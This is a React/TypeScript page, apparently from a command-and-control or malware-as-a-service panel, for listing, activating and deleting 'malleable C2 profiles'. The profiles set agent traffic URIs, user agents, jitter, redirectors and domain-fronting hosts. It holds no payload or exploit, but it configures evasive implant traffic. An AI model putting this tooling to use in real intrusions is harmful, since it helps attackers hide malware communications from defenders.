import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { Network, Plus, Trash2, Check, Zap, Globe, Server, Copy } from 'lucide-react'
import api from '../api/client'
import { useToast } from '../contexts/ToastContext'
import { PageTransition } from '../components/ui/PageTransition'
import { Card } from '../components/ui/Card'
import { MaaSBreadcrumb, ViewLabel } from '../components/ui/MaaSBreadcrumb'
import { useState } from 'react'

interface C2Profile {
  id: string
  name: string
  http_get_uri: string
  http_post_uri: string
  user_agent: string
  custom_headers: Record<string, string>
  jitter_seconds: number
  redirector_url: string
  domain_front_host: string
  active: boolean
}

export default function C2Profiles() {
  const qc = useQueryClient()
  const toast = useToast()
  const [showCreate, setShowCreate] = useState(false)

  const { data: profiles = [] } = useQuery({
    queryKey: ['c2-profiles'],
    queryFn: () => api.get<C2Profile[]>('/c2-profiles').then(r => r.data),
  })

  const { data: defaults = [] } = useQuery({
    queryKey: ['c2-profiles-defaults'],
    queryFn: () => api.get('/c2-profiles/defaults').then(r => r.data),
  })

  const activate = useMutation({
    mutationFn: (id: string) => api.post(`/c2-profiles/${id}/activate`),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ['c2-profiles'] })
      toast.addToast({ type: 'success', title: 'Profile activated', message: 'New agent builds will use this profile.' })
    },
  })

  const remove = useMutation({
    mutationFn: (id: string) => api.delete(`/c2-profiles/${id}`),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ['c2-profiles'] })
      toast.addToast({ type: 'info', title: 'Profile deleted' })
    },
  })

  return (
    <PageTransition>
      <div className="page-container space-y-6">
        <div className="flex items-center justify-between">
          <div className="space-y-2">
            <MaaSBreadcrumb macro={{ label: 'System', to: '/settings' }} />
            <ViewLabel type="macro" label="Malleable C2 Profiles" />
          </div>
          <button className="btn btn-sm btn-success gap-1" onClick={() => setShowCreate(true)}>
            <Plus size={14} /> New Profile
          </button>
        </div>

        {/* Active profile highlight */}
        {profiles.filter(p => p.active).map(p => (
          <Card key={p.id} className="p-5 border-success/30" hover={false}>
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-xl bg-success/10">
                <Zap size={18} className="text-success" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-sm">{p.name}</p>
                <p className="text-xs text-base-content/40">Active profile — used for new agent builds</p>
              </div>
              <span className="badge badge-success badge-sm gap-1">
                <Check size={10} /> ACTIVE
              </span>
            </div>
          </Card>
        ))}

        {/* Custom profiles */}
        <Card className="p-5" hover={false}>
          <h3 className="font-semibold text-sm flex items-center gap-2 mb-4">
            <Network size={14} className="text-success" /> Custom Profiles
          </h3>
          <div className="space-y-2">
            {profiles.length === 0 && (
              <p className="text-center text-base-content/30 py-8 text-sm">
                No custom profiles yet. Create one to customize your C2 traffic patterns.
              </p>
            )}
            {profiles.map(p => (
              <div key={p.id} className="flex items-center gap-3 p-3 rounded-lg bg-base-200/50 hover:bg-base-200 transition-colors">
                <Globe size={16} className={p.active ? 'text-success' : 'text-base-content/40'} />
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium">{p.name}</p>
                  <p className="text-[10px] text-base-content/40 font-mono truncate">
                    GET {p.http_get_uri} · POST {p.http_post_uri}
                  </p>
                  {p.redirector_url && (
                    <p className="text-[10px] text-amber-400/60">via {p.redirector_url}</p>
                  )}
                  {p.domain_front_host && (
                    <p className="text-[10px] text-sky-400/60">front: {p.domain_front_host}</p>
                  )}
                </div>
                {!p.active && (
                  <button
                    onClick={() => activate.mutate(p.id)}
                    className="btn btn-xs btn-outline btn-success gap-1"
                  >
                    <Check size={10} /> Activate
                  </button>
                )}
                <button
                  onClick={() => remove.mutate(p.id)}
                  className="btn btn-ghost btn-xs text-rose-400"
                >
                  <Trash2 size={12} />
                </button>
              </div>
            ))}
          </div>
        </Card>

        {/* Built-in defaults */}
        <Card className="p-5" hover={false}>
          <h3 className="font-semibold text-sm flex items-center gap-2 mb-4">
            <Server size={14} className="text-base-content/40" /> Built-in Templates
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            {defaults.map((d: any) => (
              <div key={d.name} className="p-3 rounded-lg border border-base-300 bg-base-200/30">
                <p className="text-sm font-medium mb-1">{d.name}</p>
                <p className="text-[10px] text-base-content/40 mb-2">{d.description || 'Standard profile'}</p>
                <div className="space-y-1 text-[9px] font-mono text-base-content/30">
                  <p>URI: {d.http_get_uri}</p>
                  <p>UA: {d.user_agent?.slice(0, 40)}...</p>
                  {d.domain_front_host && <p className="text-sky-400/60">Front: {d.domain_front_host}</p>}
                </div>
              </div>
            ))}
          </div>
        </Card>
      </div>
    </PageTransition>
  )
}
